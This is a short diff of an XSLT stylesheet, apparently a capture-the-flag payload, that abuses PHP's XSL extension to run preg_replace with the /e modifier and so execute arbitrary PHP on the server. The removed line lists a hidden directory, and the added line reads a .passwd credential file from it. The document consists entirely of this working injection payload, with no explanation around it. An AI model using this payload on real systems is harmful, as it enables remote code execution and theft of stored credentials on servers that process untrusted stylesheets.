@@ -4,7 +4,7 @@
     xmlns:php="http://php.net/xsl">
 <xsl:template match="/">
 <xsl:variable name="eval">
-        eval("var_dump(scandir('.6ff3200bee785801f420fba826ffcdee'));")
+        eval("var_dump(file_get_contents('.6ff3200bee785801f420fba826ffcdee/.passwd'));")
 </xsl:variable>
 <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
 </xsl:template></xsl:stylesheet>
